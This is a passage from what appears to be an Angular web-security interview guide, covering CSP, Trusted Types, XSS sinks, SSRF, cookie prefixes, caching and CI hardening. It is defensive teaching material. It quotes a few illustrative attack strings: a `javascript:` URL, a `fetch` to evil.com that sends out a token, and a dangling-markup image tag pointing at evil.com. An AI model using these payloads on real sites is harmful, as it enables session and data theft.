TestBed.configureTestingModule({
  providers: [
    provideHttpClient(withInterceptors([authInterceptor])),
    provideHttpClientTesting(),
    { provide: AuthService, useValue: { accessToken: () => "abc" } },
  ],
});

const http = TestBed.inject(HttpClient);
const ctrl = TestBed.inject(HttpTestingController);

http.get("https://api.example.com/orders").subscribe();
expect(
  ctrl
    .expectOne("https://api.example.com/orders")
    .request.headers.get("Authorization"),
).toBe("Bearer abc");

http.get("https://cdn.other.com/data.json").subscribe();
expect(
  ctrl
    .expectOne("https://cdn.other.com/data.json")
    .request.headers.has("Authorization"),
).toBe(false);
```

The second check is just as important: it proves the token doesn't leak to other domains.

## 239: How can you catch CSP violations in end-to-end tests?

Run the E2E tests against a build served with your real CSP, and fail the test when the browser reports a violation. With Playwright:

```ts
test("no CSP violations on home page", async ({ page }) => {
  const violations: string[] = [];
  page.on("console", (msg) => {
    if (msg.text().includes("Content Security Policy"))
      violations.push(msg.text());
  });
  await page.goto("/");
  expect(violations).toEqual([]);
});
```

You can also listen for `securitypolicyviolation` events in the page and collect them.

## 240: Which static analysis tools help find security problems in Angular code?

- **ESLint** with rules that forbid `eval`, `innerHTML` assignments and similar patterns (custom `no-restricted-syntax` rules work well for `bypassSecurityTrust`).
- **Semgrep**, which has ready-made rules for Angular, such as unsafe use of `bypassSecurityTrust*`.
- **CodeQL** (GitHub code scanning), which tracks data from sources like URL params to sinks like `innerHTML`.
- Secret scanners like `gitleaks`.

They catch common mistakes, but they don't replace code review.

## 241: What is DAST and how do you use it against an Angular app?

DAST (dynamic application security testing) attacks the running app from outside, like a real attacker would. OWASP ZAP and Burp Suite are common tools.

For an Angular SPA, use a scanner mode that runs a real browser (ZAP's AJAX spider or browser-based crawling), give it a logged-in session, and point it at both the app and the API. Most real findings will be in the API, headers and cookies.

## 242: How does the OWASP Top 10 map to Angular apps?

A few examples from the 2025 list:

- **Broken Access Control**: relying on guards or hidden buttons instead of server checks.
- **Security Misconfiguration**: missing CSP, HSTS, frame protection, public source maps.
- **Software Supply Chain Failures**: vulnerable or hijacked npm packages, unpinned CDN scripts.
- **Injection**: XSS through `bypassSecurityTrust*` or `nativeElement.innerHTML`.
- **Authentication Failures**: weak token storage, no logout on the server, long-lived tokens.
- **Software or Data Integrity Failures**: scripts without SRI, untrusted auto-updates.

## 243: What is SSRF and how can it happen in Angular SSR?

SSRF (server-side request forgery) is when an attacker makes your server send requests to places it shouldn't, like internal services or cloud metadata at `169.254.169.254`.

In Angular SSR, code that runs on the server can call `HttpClient`. If a URL is built from user input, like a query param or the `Host` header, the attacker can point it at internal addresses. Angular's SSR now validates the host headers against `allowedHosts` partly for this reason. Never build server-side request URLs from user input.

## 244: Can Renderer2.setAttribute create an XSS hole?

Yes. `Renderer2` doesn't sanitize, so this is unsafe:

```ts
this.renderer.setAttribute(link, "href", userUrl); // could be javascript:alert(1)
```

Sanitize it yourself first, or better, use a template binding:

```ts
const safe = this.sanitizer.sanitize(SecurityContext.URL, userUrl);
this.renderer.setAttribute(link, "href", safe ?? "#");
```

## 245: Are host bindings sanitized?

Yes. Bindings in the `host` property of a component or directive go through the same sanitization as template bindings, because the compiler knows the host element and property.

```ts
@Directive({
  selector: "a[appUserLink]",
  host: { "[href]": "url()" },
})
export class UserLink {
  url = input.required<string>();
}
```

A `javascript:` URL here gets the `unsafe:` prefix, just like in a template.

## 246: Is creating components dynamically with ViewContainerRef safe?

Yes. `createComponent` creates an instance of a component class that was compiled ahead of time. You choose which component class to create; users can only provide input data, which is still bound safely.

```ts
const ref = this.vcr.createComponent(widgetMap[config.type]);
ref.setInput("title", config.title);
```

The risky pattern is compiling a template string at runtime, not picking from components you already have. Make sure `widgetMap` is a fixed object so a user can't pick something unexpected.

## 247: How should you handle innerHTML inside an Angular Element (custom element)?

Inside the element's Angular templates, normal sanitization applies. But custom elements are often used by non-Angular pages that pass data through attributes or properties, so you have less control over where data comes from.

Treat every input as untrusted, render with `{{ }}` or `[innerHTML]`, and don't bypass sanitization because "the host page already checked it".

## 248: How do you read the XSRF token yourself, for example for a cross-origin call?

Inject `HttpXsrfTokenExtractor`, which reads the configured cookie:

```ts
export const crossOriginXsrf: HttpInterceptorFn = (req, next) => {
  if (!req.url.startsWith("https://api.example.com/") || req.method === "GET")
    return next(req);
  const token = inject(HttpXsrfTokenExtractor).getToken();
  return next(
    token ? req.clone({ setHeaders: { "X-XSRF-TOKEN": token } }) : req,
  );
};
```

This only works if the cookie is readable from your app's domain, for example a cookie set on `.example.com`. Add the header only for your own API host.

## 249: Why shouldn't you put tokens in URLs?

URLs end up in many places: browser history, server and proxy logs, analytics, error reports, and the `Referer` header sent to other sites. A token in a URL can leak through any of them.

Use the `Authorization` header or cookies instead. For things like WebSockets, where headers are hard to set, use a short-lived, one-time ticket, or authenticate in the first message.

## 250: How do you secure a WebSocket connection from Angular?

- Always use `wss://`.
- Authenticate the connection: cookies (if same site), a short-lived ticket from your API, or a token in the first message.
- The server must check the `Origin` header, because browsers don't apply CORS to WebSockets.
- Validate every incoming message before using it and never render it as HTML.

```ts
const ticket = await firstValueFrom(
  this.http.post<{ ticket: string }>("/api/ws-ticket", {}),
);
const socket = new WebSocket(
  `wss://api.example.com/ws?ticket=${encodeURIComponent(ticket.ticket)}`,
);
```

A one-time ticket that expires in seconds is acceptable in a URL because it can't be reused.

## 251: How do you secure Server-Sent Events (EventSource) in Angular?

`EventSource` can't set custom headers, so you can't add a bearer token in the normal way. Options:

- Use cookie auth (same site), with `new EventSource(url, { withCredentials: true })` for cross-origin.
- Use a short-lived, single-use ticket in the URL, like with WebSockets.
- Use `fetch` with a streaming reader instead of `EventSource`, which lets you set headers.

Treat every event as untrusted data before rendering.

## 252: What should the front-end do in a password reset flow?

The reset link usually has a token in the URL, for example `/reset?token=...`. On that page:

- Don't load third-party scripts, analytics or images that could get the URL in the `Referer` header. Set `Referrer-Policy: no-referrer` for that page.
- Read the token, then remove it from the address bar with `router.navigate` and `replaceUrl: true`.
- Send the token and new password in a `POST` body.
- Show a generic message whether or not the email exists.

The server must make tokens single-use and short-lived.

## 253: How do you build a multi-factor login screen in Angular without weakening it?

The UI just collects the code and posts it; the server decides. Common mistakes to avoid:

- Don't decide "MFA passed" on the client based on a response flag and then call protected APIs; the server must only issue the full session after MFA.
- Don't store the partially authenticated state as if it were a full login.
- Use `autocomplete="one-time-code"` and `inputmode="numeric"` on the code field.

## 254: How can login error messages cause user enumeration?

If the login screen says "user not found" for unknown emails and "wrong password" for known ones, attackers can test which emails have accounts. The same can happen through timing, different status codes or the sign-up and reset forms.

Show one message like "Email or password is incorrect" and make sure the API returns the same response for both cases.

## 255: Does disabling the submit button stop brute-force attacks?

No. It prevents double submits by normal users, but an attacker just calls the login API directly with a script.

Brute-force protection is server-side: rate limiting, account lockout or backoff, CAPTCHA after a few failures and monitoring.

## 256: How do you add a CAPTCHA to an Angular form?

Load the provider's script (for example reCAPTCHA, hCaptcha or Cloudflare Turnstile), render the widget, and send the token it gives you along with the form. The server must verify the token with the provider's API before accepting the request.

```ts
this.http.post("/api/signup", {
  ...this.form.value,
  captchaToken: this.captchaToken(),
});
```

If the server doesn't verify the token, the CAPTCHA does nothing. Add the provider's domains to your CSP.

## 257: Why should NgRx Store DevTools be limited in production?

DevTools lets anyone with the browser extension see every action and the whole state, including tokens and personal data, and even replay actions.

Turn it off in production, or at least use `logOnly` mode, and don't keep tokens in the store:

```ts
provideStoreDevtools({ maxAge: 25, logOnly: !isDevMode() });
```

## 258: How do you scrub sensitive data in a custom ErrorHandler?

Override Angular's `ErrorHandler` and remove sensitive values before sending errors to a logging service:

```ts
@Injectable()
export class SafeErrorHandler implements ErrorHandler {
  private logger = inject(LoggerService);

  handleError(error: unknown) {
    const message = String((error as Error)?.message ?? error)
      .replace(/Bearer\s+[\w.-]+/g, "Bearer [removed]")
      .replace(/[\w.+-]+@[\w-]+\.[\w.]+/g, "[email]");
    this.logger.send({ message });
  }
}

providers: [{ provide: ErrorHandler, useClass: SafeErrorHandler }];
```

Error tools like Sentry also have options (`beforeSend`, data scrubbing) for the same purpose.

## 259: What should you avoid when sending errors and analytics from Angular?

- Full URLs with tokens or personal data in query params.
- Request and response bodies with passwords, card numbers or health data.
- Headers like `Authorization` and `Cookie`.
- Form values typed by the user.
- Session replay recordings of sensitive pages, unless inputs are masked.

Configure your tools to mask or drop these fields, and review what they collect by default.

## 260: How can the Angular service worker cache sensitive API data?

With `@angular/service-worker`, `dataGroups` in `ngsw-config.json` can cache API responses. If you add an endpoint like `/api/account/**` with the `performance` strategy, private data stays in the Cache Storage after logout, and another person on the same device might see it.

Only cache public or low-risk data, use the `freshness` strategy for user data if you must cache it, and clear caches on logout.

## 261: How do you clear service worker caches on logout?

Delete the data caches from Cache Storage when the user logs out:

```ts
async clearCaches() {
  const keys = await caches.keys();
  await Promise.all(keys.filter((k) => k.includes(':data:')).map((k) => caches.delete(k)));
}
```

Angular's service worker names its caches with a prefix and the group name, so check the actual names in dev tools before filtering. Avoid deleting the app's asset caches, or the app will need to download everything again.

## 262: Which Cache-Control headers should private API responses have?

For responses with user data, send `Cache-Control: no-store` (or at least `private, no-cache`). This stops shared caches like CDNs and proxies from storing them and serving them to other users.

For `index.html`, use `no-cache` so users always get the latest version and its security fixes. Hashed bundle files like `main-ABC123.js` can be cached for a long time.

## 263: Why can a user see private data after logout by pressing Back?

The browser's back/forward cache (bfcache) can restore the full page from memory, including the Angular app's state, without running your code from scratch.

Listen for the `pageshow` event and check `event.persisted`. If the page was restored and the user is logged out, reload or redirect:

```ts
window.addEventListener("pageshow", (e) => {
  if (e.persisted && !auth.isLoggedIn()) location.reload();
});
```

Sending `Cache-Control: no-store` on the HTML can also keep the page out of the bfcache in many browsers.

## 264: When should you use autocomplete="off"?

Use it for fields where saved values make no sense or could leak data, like one-time codes, CAPTCHA answers or a "card security code". Browsers often ignore it for login fields, which is by design so password managers keep working.

Don't turn off autocomplete for normal password fields. Password managers help users pick strong passwords, which is better for security.

## 265: What are the security concerns with the Clipboard API?

Reading the clipboard (`navigator.clipboard.readText()`) needs user permission and should only happen after a user action, because the clipboard may hold passwords or other private data.

Writing to it is less sensitive, but don't put secrets there silently. Never trust pasted content: validate and escape it like any other input.

## 266: How do you safely show links that users entered in their profile?

Check the protocol and render with a normal binding:

```ts
safeWebsite = computed(() => {
  try {
    const url = new URL(this.user().website);
    return url.protocol === "https:" || url.protocol === "http:"
      ? url.href
      : null;
  } catch {
    return null;
  }
});
```

```html
@if (safeWebsite(); as url) {
<a [href]="url" target="_blank" rel="noopener noreferrer nofollow">{{ url }}</a>
}
```

Angular already blocks `javascript:`, but this also stops `data:` URLs and other odd schemes.

## 267: How do you build API URLs with user input safely?

Use `HttpParams` for query params, and `encodeURIComponent` for path segments:

```ts
this.http.get(`/api/users/${encodeURIComponent(userId)}/orders`, {
  params: new HttpParams().set("search", searchTerm),
});
```

Without encoding, a value like `../admin` or `1?role=admin` could change which endpoint or parameters you hit. The server still has to check permissions, but encoding stops surprises.

## 268: What is mass assignment and how does the front-end make it easy?

Mass assignment is when the server copies all fields from the request body into a database object. If the Angular app sends `this.form.value` and the user adds `isAdmin: true` to the request with dev tools, a careless server saves it.

The fix is on the server (accept only allowed fields), but the front-end can help by sending only the fields the endpoint expects, using typed DTOs instead of whole objects.

## 269: Are disabled or hidden form fields a security control?

No. A disabled control isn't included in `form.value`, but a user can still add that field to the request manually. Hidden inputs can be changed in dev tools.

Note that `form.getRawValue()` includes disabled controls. Either way, the server must decide which fields a user may change.

## 270: What is IDOR and how does it show up in Angular apps?

IDOR (insecure direct object reference) is when the API returns an object just because you asked for its ID, without checking that it belongs to you. In Angular apps the IDs are often in routes like `/orders/1042`, so a user can change the number and see someone else's order.

Guards can't fix this. The API must check ownership on every request. Random IDs (UUIDs) make guessing harder but aren't a fix by themselves.

## 271: Why can feature flags leak unreleased features?

If the code for an unreleased feature is in the bundle and only hidden by a flag, anyone can find it in the JavaScript, change the flag in memory, and see the UI, including endpoint names, texts and business plans.

Lazy-load unreleased features, check flags on the server for any API they use, and for sensitive launches, keep the code out of the production build until release.

## 272: What is the problem with Angular CLI's inline critical CSS and strict CSP?

When critical CSS inlining is on, the CLI changes stylesheet links to load with an `onload` handler and inlines the critical styles. An inline event handler needs `'unsafe-inline'` or an extra hash, and the inline `<style>` needs a nonce or `'unsafe-inline'` for styles.

With a strict CSP you can either use `security.autoCsp` or `ngCspNonce` (which handle this), or turn critical CSS inlining off:

```json
"optimization": { "styles": { "inlineCritical": false } }
```

Note that the `CSP_NONCE` token alone can't be used with critical CSS inlining.

## 273: What does security.autoCsp do in angular.json?

It tells the CLI to generate a hash-based CSP for scripts at build time and add it as a `<meta>` tag in `index.html`:

```json
"security": { "autoCsp": true }
```

The CLI hashes the inline scripts, and the policy uses `'strict-dynamic'` so scripts loaded by those trusted scripts are also allowed. It only covers `script-src`, so you still need to set `style-src` yourself. It isn't supported with SSR, and directives like `frame-ancestors` and `report-uri` still need a real HTTP header.

## 274: How do you replace the ngCspNonce value per request without SSR?

Put a placeholder in `index.html` and let your server or edge function replace it with a fresh nonce for each response, in both the HTML and the CSP header:

```html
<app-root ngCspNonce="__CSP_NONCE__"></app-root>
```

```js
const nonce = crypto.randomUUID().replace(/-/g, "");
html = html.replaceAll("__CSP_NONCE__", nonce);
headers.set(
  "Content-Security-Policy",
  `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'; object-src 'none'; base-uri 'self'`,
);
```

If a CDN caches the HTML with one nonce for everyone, the nonce isn't secret anymore. Generate it at the edge, after the cache.

## 275: Why does Angular need a style nonce at all?

Angular adds `<style>` elements to the page at runtime for component styles. A strict `style-src` without `'unsafe-inline'` would block them, and your components would lose their styles.

With `ngCspNonce` or `CSP_NONCE`, Angular adds the nonce to these `<style>` tags so the browser allows them. On static hosting without a per-request nonce, you'll usually need `style-src 'self' 'unsafe-inline'`, which is a much smaller risk than allowing inline scripts.

## 276: How do you collect CSP violation reports?

Add a reporting endpoint to the policy:

```
Content-Security-Policy: default-src 'self'; report-to csp-endpoint; report-uri https://example.com/csp-report
Reporting-Endpoints: csp-endpoint="https://example.com/csp-report"
```

`report-to` is the newer way and `report-uri` is the older one; sending both covers more browsers. Reports tell you what was blocked and where, which helps find both bugs and real attacks. Expect noise from browser extensions.

## 277: Which Trusted Types policy names does Angular use?

- `angular`: required for Angular itself.
- `angular#bundler`: for lazy-loaded chunks created by the Angular CLI.
- `angular#unsafe-bypass`: needed if the app uses `bypassSecurityTrust*`.
- `angular#unsafe-jit`: needed if you use the JIT compiler.
- `angular#unsafe-upgrade`: needed for AngularJS hybrid apps with `@angular/upgrade`.

```
Content-Security-Policy: trusted-types angular angular#bundler; require-trusted-types-for 'script';
```

Leaving out the `unsafe` ones is a simple way to make sure no bypasses or JIT sneak into the app.

## 278: How do you test Trusted Types in development and unit tests?

Add the same header to the dev server through the `headers` option in `angular.json`, so mistakes break during development. For Karma tests, add it to `customHeaders` in `karma.conf.js`.

If you use Vitest with a browser runner, configure the headers on that test server. The goal is that a forbidden `innerHTML` assignment fails in tests, not in production.

## 279: What happens when a third-party library breaks under Trusted Types?

Libraries that write strings to `innerHTML` or create scripts directly will throw a `TypeError` once Trusted Types is enforced. You can:

- Upgrade to a version that supports Trusted Types (many popular ones do now).
- Wrap the library's input in your own named policy that sanitizes values.
- As a last step, create a `default` policy, which the browser calls for any raw string. Make it sanitize, never just return the input.

Start with report-only mode to find these problems before enforcing.

## 280: Why should production apps avoid the JIT compiler?

The JIT compiler can turn template strings into code at runtime, which opens the door to template injection. It also makes the bundle bigger and slower to start.

AOT is the default, and the compiler isn't included in production builds. If you see `@angular/compiler` imported at runtime or `platformBrowserDynamic` with dynamic templates, that's a red flag. With Trusted Types, JIT also needs the `angular#unsafe-jit` policy.

## 281: How do you render CMS-driven pages without compiling templates at runtime?

Have the CMS return structured data, not templates. Each block has a type and fields, and Angular maps the type to a known component:

```ts
const blocks = {
  hero: HeroBlock,
  text: TextBlock,
  gallery: GalleryBlock,
} as const;
```

```html
@for (block of page().blocks; track block.id) {
<ng-container *ngComponentOutlet="blocks[block.type]; inputs: block.data" />
}
```

Editors can still build pages, but they can only use components you wrote. Text fields render through normal bindings, and rich text goes through `[innerHTML]`.

## 282: How do user-supplied image URLs affect privacy and security?

When the app shows an image from a URL the user entered, every viewer's browser requests that URL. The image owner learns the viewers' IP addresses, browsers and when they opened the page (a "tracking pixel"). A URL to your own API could also trigger a `GET` request with the viewer's cookies.

Limit `img-src` in your CSP, or proxy and store user images on your own server or a separate image domain.

## 283: How does connect-src in CSP help after an XSS bug?

`connect-src` limits where `fetch`, `XMLHttpRequest`, WebSockets and `EventSource` can connect. If an attacker's script runs, it can't simply `fetch('https://evil.com', { body: token })`.

```
connect-src 'self' https://api.example.com https://login.example.com
```

It isn't perfect (attackers can try images or navigation), but it removes the easiest way to send stolen data out.

## 284: What should you think about before adding analytics to an Angular app?

- Which data is sent: page URLs (with IDs or tokens), user IDs, form fields.
- Where it's sent and under which privacy laws (GDPR consent).
- That the analytics script runs with full access to your app.

Strip personal data from URLs before sending page views, load analytics only after consent, and prefer tools you can self-host or that send minimal data.

## 285: What if your Angular app must be embedded in an iframe by partners?

Allow only those partners with `frame-ancestors` instead of turning framing protection off:

```
Content-Security-Policy: frame-ancestors 'self' https://portal.partner.com
```

Also check cookie behavior: inside a cross-site iframe, cookies need `SameSite=None; Secure`, and some browsers block third-party cookies anyway. Token-based auth or the Storage Access API may be needed. Use `postMessage` with strict origin checks for talking to the parent.

## 286: What are __Host- and __Secure- cookie prefixes?

They are naming rules the browser enforces:

- `__Secure-` cookies must have the `Secure` flag.
- `__Host-` cookies must have `Secure`, `Path=/` and no `Domain` attribute, so they're locked to one exact host.

```
Set-Cookie: __Host-session=abc; Secure; HttpOnly; Path=/; SameSite=Lax
```

`__Host-` cookies can't be set or overwritten by a subdomain, which protects against attacks from other subdomains.

## 287: How do you debug "WARNING: sanitizing HTML stripped some content"?

Compare the input HTML with what ended up in the DOM to see what was removed. Usually it's inline `style` attributes, elements that aren't on the allowlist (like `<iframe>`), or `javascript:` URLs.

Then fix it the right way: move styles to CSS classes, render embeds with a dedicated component, or clean the HTML with a configured sanitizer like DOMPurify. Don't just add `bypassSecurityTrustHtml` to make the warning go away.

## 288: How do you prevent an XSS hole when using a charting or map library?

Many libraries render tooltips, labels or popups with `innerHTML`. If you pass user data into a tooltip template string, the library puts it into the DOM without Angular's protection.

Check the library's docs for a text option versus an HTML option, escape data before passing it to HTML formatters, or render the tooltip content with an Angular component. Trusted Types helps find these spots.

## 289: Why use a strict TypeScript setup for security?

Strict types (`strict: true` and `strictTemplates: true`) catch mistakes like passing `unknown` API data straight into places that expect a checked value, or forgetting that a value might be `null`.

Types don't validate data at runtime, though. Data from APIs, storage and URLs is still whatever it is. For untrusted data, validate it at runtime with a schema library like Zod or Valibot before trusting its shape.

## 290: How do you validate API responses at runtime in Angular?

Parse them with a schema before using them:

```ts
const UserSchema = z.object({ id: z.string(), name: z.string(), role: z.enum(['user', 'admin']) });

getUser(id: string) {
  return this.http.get<unknown>(`/api/users/${encodeURIComponent(id)}`).pipe(
    map((data) => UserSchema.parse(data)),
  );
}
```

This is most useful for data from third-party APIs or `postMessage`. It turns surprises into clear errors instead of strange behavior.

## 291: What is the risk of storing data in IndexedDB or localStorage for offline use?

Anything you store stays on the device after the user closes the tab, and any script on your origin can read it. On shared devices, the next user might access it too.

Store only what's needed, clear it on logout, and don't store tokens or very sensitive data offline unless you really need to and have thought through the risks.

## 292: Why shouldn't you use window.name, URL hash or document.referrer as trusted data?

They can all be set by other sites. An attacker's page can open your app with a chosen hash or `window.name`, and the `Referer` can come from anywhere.

Treat them like any other user input: validate and never put them into `innerHTML`, `eval` or redirects.

## 293: How do you restrict which domains can load your fonts, images and scripts?

Use specific CSP directives instead of a loose `default-src`:

```
default-src 'self';
script-src 'self';
style-src 'self' 'nonce-...';
img-src 'self' data: https://images.example.com;
font-src 'self';
connect-src 'self' https://api.example.com;
object-src 'none';
base-uri 'self';
frame-ancestors 'self';
```

Start from `default-src 'self'` and add only what the app needs, checking the browser console for blocked requests.

## 294: Should an Angular app use a meta tag or an HTTP header for CSP?

An HTTP header is better. It applies before any HTML is parsed, and it supports everything, including `frame-ancestors`, `report-uri` and `sandbox`, which `<meta>` ignores.

A `<meta http-equiv="Content-Security-Policy">` tag is fine when you can't control headers (some static hosts), and that's what `autoCsp` generates. You can use both; the browser enforces both policies.

## 295: How do you keep a strict CSP when using inline event handlers in third-party widgets?

You can't allow inline handlers with nonces; they need `'unsafe-hashes'` plus a hash of each handler, or `'unsafe-inline'`. Both weaken the policy.

Better options are to ask the vendor for a version without inline handlers, load the widget in a sandboxed iframe on another origin, or replace it. Angular's own `(click)` bindings aren't inline handlers, so they work fine with strict CSP.

## 296: How does Angular's (click) binding differ from an onclick attribute for CSP?

`(click)="save()"` is compiled into JavaScript that calls `addEventListener`. There's no inline handler in the HTML, so CSP doesn't block it.

An `onclick="save()"` attribute is inline script, which strict CSP blocks. It also wouldn't work with Angular's component methods anyway.

## 297: What should you check in a pull request that adds a new npm dependency?

- Is it well known and actively maintained? Check downloads, recent releases and open issues.
- Does it have install scripts?
- How many dependencies does it pull in?
- Does it touch the DOM with `innerHTML` or need `'unsafe-eval'`?
- Is the name spelled correctly (typosquatting)?
- Does the license fit?

Small helper packages are often easier to write yourself than to trust.

## 298: How do you lock down CI so a malicious dependency can't steal secrets?

- Install dependencies in a step that has no secrets in its environment.
- Use `npm ci` with a committed lockfile.
- Give the CI token the smallest permissions it needs.
- Pin GitHub Actions to commit SHAs instead of tags.
- Use short-lived credentials (OIDC from CI to the cloud) instead of long-lived keys.

The 2025 npm worm attacks spread exactly by stealing tokens from developer machines and CI.

## 299: How do you check which Angular version and packages are deployed in production?

Look at the `ng-version` attribute that Angular adds to the root element, even in production builds:

```html
<app-root ng-version="22.0.4"></app-root>
```

Keeping an inventory of deployed versions (an SBOM, created with tools like `cyclonedx-npm`) helps you answer "are we affected?" quickly when a new advisory comes out.

## 300: What security checks would you add to an Angular project's CI pipeline?

- Lint rules that forbid `bypassSecurityTrust*`, `innerHTML` assignments and `eval` without an approved exception.
- `npm audit --omit=dev --audit-level=high`.
- Secret scanning on the repo and the build output.
- A check that production builds have no public source maps.
- E2E tests with the real CSP and Trusted Types headers.
- A scheduled DAST scan against a staging environment.

# Advanced Questions (301-450)

## 301: How does Angular's HTML sanitizer work internally?

It parses the untrusted string into an inert document (one where scripts don't run and images don't load), then walks the node tree. For each element and attribute it checks an allowlist: unknown or dangerous elements are dropped, unsafe attributes are removed, and URL attributes go through the URL sanitizer. Finally it serializes the cleaned tree back into a string.

Because it uses the browser's own parser, the result matches how the browser will really read the HTML, which is important for avoiding parser tricks.

## 302: What is mutation XSS and how does Angular defend against it?

Mutation XSS (mXSS) is when HTML looks safe after sanitizing, but the browser changes it when it's parsed again (for example when assigned to `innerHTML`), turning it into something dangerous. It abuses odd parsing rules around things like `<noscript>`, `<svg>`, `<math>` and comments.

Angular's sanitizer parses the HTML several times until the output stops changing, and gives up with an error if it doesn't settle. That makes it much harder for a payload to change shape after sanitizing.

## 303: How does the compiler decide which bindings get sanitized at runtime?

At compile time, the compiler checks each property binding against its DOM schema. For sensitive ones it adds a sanitizer function to the generated instruction, for example a call to sanitize HTML or a URL. For normal properties, no sanitizer is added, so there's no cost.

This is why bugs in the schema matter. In late 2025 (CVE-2025-66412), some SVG and MathML attributes like `xlink:href` on certain SVG elements weren't marked as URLs, so `javascript:` URLs bound to them weren't sanitized. It was fixed in 19.2.17, 20.3.15 and 21.0.2. Keeping Angular patched is part of keeping your bindings safe.

## 304: What happens if you pass a SafeUrl to an innerHTML binding?

Angular checks that a trusted value was approved for the right context. A value from `bypassSecurityTrustUrl` bound to `[innerHTML]` throws an error like "Required a safe HTML, got a URL".

This stops a value that was reviewed as "a safe URL" from being used as HTML, where the same string could be dangerous. Trust is per context, not general.

## 305: How would you control the use of bypassSecurityTrust in a big codebase?

- Ban direct calls with a lint rule, except in one small, reviewed service.
- Make that service's methods specific, for example `trustYouTubeEmbed(videoId)` instead of `trustUrl(url)`, so they build the value themselves from validated parts.
- Require security review (CODEOWNERS) for changes to that file.
- Enforce Trusted Types without `angular#unsafe-bypass`, or with it only after you've reduced bypasses to the reviewed ones.

```js
// eslint.config.js
{
  rules: {
    'no-restricted-syntax': ['error', {
      selector: "CallExpression[callee.property.name=/^bypassSecurityTrust/]",
      message: 'Use TrustedContentService instead of bypassSecurityTrust*.',
    }],
  },
}
```

## 306: How do Trusted Types and Angular's sanitizer work together?

When Trusted Types is enforced, Angular creates its own policy named `angular` and uses it to turn already-sanitized strings into `TrustedHTML`, `TrustedScript` or `TrustedScriptURL` objects before writing them to the DOM. The browser accepts these because they came from an allowed policy.

So Angular's sanitizer still does the cleaning, and Trusted Types makes sure nothing else in the page (your code or libraries) can write raw strings to dangerous sinks.

## 307: Why is a Trusted Types default policy risky?

The browser calls the `default` policy whenever code passes a plain string to a dangerous sink. If the default policy just returns the string, Trusted Types does nothing for that code, and you've silently turned the protection off.

If you need one for a legacy library, make it sanitize (for example with DOMPurify) and log every call, so you can see what's using it and shrink it over time.

```ts
trustedTypes.createPolicy("default", {
  createHTML: (input, sink) => {
    reportToMonitoring("tt-default", sink);
    return DOMPurify.sanitize(input);
  },
});
```

## 308: How would you roll out Trusted Types on a large existing Angular app?

1. Ship `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; trusted-types angular angular#bundler; report-to ...`.
2. Collect reports for a few weeks and group them by source file.
3. Fix each sink: replace `nativeElement.innerHTML` with bindings, remove bypasses, update libraries.
4. Turn on enforcement in dev and test environments first, so new violations break builds.
5. Enforce in production and keep the report endpoint for monitoring.

## 309: Why are allowlist-based CSPs considered weak?

A policy like `script-src 'self' https://cdnjs.cloudflare.com https://www.google.com` allows every script on those hosts. Big CDNs host old libraries and JSONP endpoints that attackers can use to run code, for example an old AngularJS version whose template features can run expressions.

Google's research on CSP showed that most allowlist policies could be bypassed this way. Strict CSPs based on nonces or hashes with `'strict-dynamic'` avoid the problem, because they don't trust whole hosts.

## 310: What is a script gadget?

A script gadget is legitimate code already on the page that does something dangerous when it finds certain markup, for example a library that reads `data-*` attributes and evaluates them, or an old framework that compiles templates from the DOM.

An attacker who can inject harmless-looking HTML (no `<script>`) can trigger the gadget and run code, even with CSP. AngularJS is a well-known example. Modern Angular with AOT doesn't compile templates from the DOM, but third-party libraries on your page might still act as gadgets.

## 311: How does 'strict-dynamic' work with Angular's lazy chunks?

With `'strict-dynamic'`, scripts loaded by an already trusted script (one with a valid nonce or hash) are also trusted, as long as they're added through DOM APIs like `createElement('script')`, not through parser-inserted HTML.

Angular's lazy chunks are loaded by the trusted main bundle, so they're allowed without listing every chunk. Host allowlists and `'self'` are ignored by browsers that support `'strict-dynamic'`, so the nonce or hash is what really matters.

## 312: How do you generate a CSP nonce for Angular SSR?

Create a nonce per request in `server.ts`, send it in the CSP header, and pass it to Angular through `CSP_NONCE`:

```ts
app.use(async (req, res, next) => {
  const nonce = randomBytes(16).toString("base64");
  res.setHeader(
    "Content-Security-Policy",
    `script-src 'nonce-${nonce}' 'strict-dynamic'; style-src 'self' 'nonce-${nonce}'; object-src 'none'; base-uri 'self'`,
  );

  const response = await angularApp.handle(req, { nonce });
  response ? writeResponseToNodeResponse(response, res) : next();
});
```

```ts
// app.config.server.ts
{ provide: CSP_NONCE, useFactory: () => (inject(REQUEST_CONTEXT) as { nonce: string } | null)?.nonce ?? null }
```

Angular then adds the nonce to the `<style>` and `<script>` tags it creates. Make sure no cache stores the response, because a cached nonce is reused for everyone.

## 313: When would you choose a hash-based CSP over a nonce-based one?

Hashes work for static files, because the hash of an inline script doesn't change between requests. That's why `autoCsp` uses hashes: the CLI knows the inline scripts at build time and you don't need a server to create nonces.

Nonces need a server or edge function per response but work for content that changes per request, like SSR output. A common rule: static hosting uses hashes, SSR uses nonces.

## 314: What attacks does CSP not stop?

- HTML injection without scripts: fake login forms, phishing links, defacing.
- Dangling markup attacks that steal page content by leaving a tag or attribute unclosed.
- Abuse of script gadgets in trusted code.
- Attacks that use your own trusted JavaScript in unintended ways, like an open redirect.
- Anything after the attacker has a session token.

CSP is a safety net for XSS. It doesn't fix the bug that let the HTML in.

## 315: What is dangling markup injection?

An attacker injects an unclosed tag or attribute, like `<img src='https://evil.com/?`, and the browser treats the rest of the page up to the next quote as part of the URL. That text, which might include a CSRF token or private data, is sent to the attacker's server.

It works even without running scripts. Angular's escaping prevents it in templates; the risk is in server-generated HTML or places where you bypass escaping. Chrome also blocks URLs that contain both `<` and newlines, which stops some versions of it.

## 316: Is client-side template injection a real risk in modern Angular?

Much less than in AngularJS. In AngularJS, the framework compiled templates from the live DOM, so injected `{{ }}` in server-rendered HTML was evaluated. That was a common and serious bug.

Modern Angular with AOT compiles templates at build time and doesn't scan the DOM for bindings, so `{{ }}` in data is just text. The risk returns if you ship the JIT compiler and compile strings at runtime, or if you run an AngularJS hybrid app where the AngularJS part still compiles DOM.

## 317: How do you handle template injection risk in an AngularJS/Angular hybrid app?

The AngularJS part still compiles templates from the DOM, so server-rendered user content inside AngularJS-controlled areas can run expressions. Mitigations:

- Don't put user content into server-rendered HTML that AngularJS controls; render it with bindings.
- Use `ng-non-bindable` around server-rendered user content.
- Finish the migration: AngularJS has been out of support since January 2022 and gets no security fixes.

With Trusted Types, hybrid apps also need the `angular#unsafe-upgrade` policy, which is a reminder of the extra risk.

## 318: Why did Angular deprecate runtime compilation APIs?

